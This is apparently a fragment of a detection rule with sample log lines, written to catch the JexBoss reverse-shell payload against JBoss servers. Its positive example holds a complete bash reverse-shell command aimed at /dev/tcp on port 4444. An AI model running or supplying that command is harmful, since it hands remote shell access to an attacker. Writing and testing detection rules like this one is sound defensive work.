    upstream_id: 8ec2c8b4-557a-4121-b87c-5dfb3a602fae
  rationale: >-
    The rule needs both 'bash -c /bin/bash' and '&/dev/tcp/' on the line. JexBoss emits them in this order in its
    JBoss reverse-shell payload, so the anchored form keeps the meaning with a bounded gap.
  examples:
    positive:
      - 'Nov 20 15:15:00 jb01 java[2001]: Runtime exec: /bin/bash -c /bin/bash -i >&/dev/tcp/203.0.113.7/4444 0>&1'
    negative:
      - 'Nov 20 15:16:00 jb01 java[2001]: Runtime exec: /bin/bash -c /opt/jboss/bin/standalone.sh'
      - 'Nov 20 15:17:00 jb01 bash[685]: HISTORY: bash -c /bin/bash --version'

